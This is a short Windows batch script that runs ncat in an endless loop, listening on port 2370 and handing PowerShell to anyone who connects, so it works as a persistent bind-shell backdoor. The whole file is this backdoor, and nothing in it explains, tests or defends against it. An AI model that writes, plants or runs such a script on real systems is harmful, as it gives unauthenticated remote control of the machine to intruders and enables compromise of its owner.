@ECHO OFF
:init_bd:
ncat -lp 2370 -e powershell.exe
timeout /nobreak 600 
goto :init_bd:
